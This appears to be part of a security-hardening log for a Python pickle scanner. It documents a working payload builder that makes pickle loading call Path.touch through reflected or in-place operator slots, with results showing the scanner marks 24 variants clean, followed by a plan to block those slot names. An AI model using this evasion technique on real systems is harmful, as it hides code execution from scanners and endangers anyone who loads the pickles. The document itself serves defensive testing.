@@ -4642,3 +4642,175 @@ Blocking plan:
 
 Performance note: twelve literals in the existing magic-method match arm, no
 binary-operator flow modeling.
+
+## Turn 93 - Reverse and in-place arithmetic method family gap
+
+Candidate payload:
+
+- Create a runtime subclass with `builtins.type`.
+- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
+  paths.
+- Install `pathlib.Path.touch` as a reflected or in-place operator method, for
+  example `__radd__` or `__iadd__`.
+- Instantiate the class with a marker path.
+- Call the matching clean `operator` helper during unpickling:
+  `operator.add(0o666, instance)` for the reflected case or
+  `operator.iadd(instance, 0o666)` for the in-place case.
+
+Representative protocol 4 reflected payload builder:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    return b"U" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_operator_add_radd_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        text("DerivedPath"),
+        sg("pathlib", "PosixPath"),
+        b"\x85",
+        b"}",
+        text("__radd__"),
+        sg("pathlib", "Path.touch"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        text(str(marker)),
+        b"\x85R\x940",
+        sg("operator", "add"),
+        b"M" + (0o666).to_bytes(2, "little"),
+        b"h\x01",
+        b"\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Reflected `__radd__` control scanner result: `len=136`,
+  `status=complete`, `verdict=clean`, `findings=[]`, `notices=[]`
+- Reflected `__radd__` RCE scanner result: `len=157`, `status=complete`,
+  `verdict=clean`, `findings=[]`, `notices=[]`
+- In-place `__iadd__` control scanner result: `len=137`,
+  `status=complete`, `verdict=clean`, `findings=[]`, `notices=[]`
+- In-place `__iadd__` RCE scanner result: `len=159`, `status=complete`,
+  `verdict=clean`, `findings=[]`, `notices=[]`
+- Scanner import references for the reflected representative:
+  `builtins.type`, `pathlib.PosixPath`, `pathlib.Path.touch`, and
+  `operator.add`, all with `is_dangerous=False`
+- Scanner import references for the in-place representative:
+  `builtins.type`, `pathlib.PosixPath`, `pathlib.Path.touch`, and
+  `operator.iadd`, all with `is_dangerous=False`
+- Control proof: the construction-only pickle returns a `DerivedPath` instance
+  and does not create the marker
+- Unpickle result: the active payload creates its marker and returns `None`
+
+Sibling reflected slot proof:
+
+| Operator | Method | Scanner verdict | Runtime result |
+| --- | --- | --- | --- |
+| `operator.add` | `__radd__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.sub` | `__rsub__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.mul` | `__rmul__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.matmul` | `__rmatmul__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.truediv` | `__rtruediv__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.mod` | `__rmod__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.pow` | `__rpow__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.lshift` | `__rlshift__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.rshift` | `__rrshift__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.and_` | `__rand__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.xor` | `__rxor__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.or_` | `__ror__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+
+Sibling in-place slot proof:
+
+| Operator | Method | Scanner verdict | Runtime result |
+| --- | --- | --- | --- |
+| `operator.iadd` | `__iadd__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.isub` | `__isub__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.imul` | `__imul__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.imatmul` | `__imatmul__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.itruediv` | `__itruediv__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.imod` | `__imod__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.ipow` | `__ipow__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.ilshift` | `__ilshift__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.irshift` | `__irshift__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.iand` | `__iand__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.ixor` | `__ixor__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.ior` | `__ior__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+
+RCE mechanism:
+
+- Reflected variant: `operator.add(0o666, instance)` first lets the integer
+  left operand decline the path object, then dispatches to
+  `instance.__radd__(0o666)`. Because `__radd__` points at `Path.touch`,
+  CPython calls `Path.touch(instance, mode=0o666)`.
+- In-place variant: `operator.iadd(instance, 0o666)` dispatches directly to
+  `instance.__iadd__(0o666)`, again calling `Path.touch(instance, mode=0o666)`.
+- Both paths create the marker before `pickle.loads()` returns and then return
+  `None`.
+
+Why the scanner missed it:
+
+- The forward binary operator slots are now in the suspicious magic-method
+  list, but reflected slots (`__radd__`, `__rsub__`, etc.) and in-place slots
+  (`__iadd__`, `__isub__`, etc.) are still absent.
+- The corresponding `operator` helpers are absent from `DANGEROUS_GLOBALS`;
+  current `operator` coverage includes `call`, `attrgetter`, `itemgetter`, and
+  `methodcaller`.
+- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
+  wildcard-dangerous module.
+- The dangerous callable is hidden as a synthesized reflected or in-place
+  operator method, so the final visible call target is a common operator helper
+  rather than the attacker-selected callable.
+
+Performance note: the focused next block should add the reflected and in-place
+operator slot names above to the suspicious magic-method string list. This is
+larger than the previous block but still just fixed literal matching in the
+existing string policy, with no operator-flow modeling.
+
+## Turn 94 - Block reflected and in-place arithmetic seeds
+
+Blocking plan:
+
+- Add the reflected and in-place arithmetic/bitwise dunder slots from Turn 93
+  to the existing suspicious magic-method string list:
+  `__radd__`, `__rsub__`, `__rmul__`, `__rmatmul__`, `__rtruediv__`,
+  `__rmod__`, `__rpow__`, `__rlshift__`, `__rrshift__`, `__rand__`,
+  `__rxor__`, `__ror__`, `__iadd__`, `__isub__`, `__imul__`, `__imatmul__`,
+  `__itruediv__`, `__imod__`, `__ipow__`, `__ilshift__`, `__irshift__`,
+  `__iand__`, `__ixor__`, and `__ior__`.
+- Leave the corresponding `operator` helpers, `builtins.type`,
+  `pathlib.PosixPath`, and `pathlib.Path.touch` allowed for this focused
+  block. The static signal is the attacker-controlled reflected or in-place
+  operator slot name.
+- Add CPython oracle regressions that build
+  `type(..., {"__radd__": Path.touch})`-style reflected payloads and
+  `type(..., {"__iadd__": Path.touch})`-style in-place payloads for all 24
+  slots, verifies scan-time detection on both construction-only controls and
+  active `operator.*` RCE variants, proves the control instances do not create
+  markers, then proves each operator dispatch creates its marker during
+  `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: twenty-four literals in the existing magic-method match arm,
+no reflected or in-place operator flow modeling.
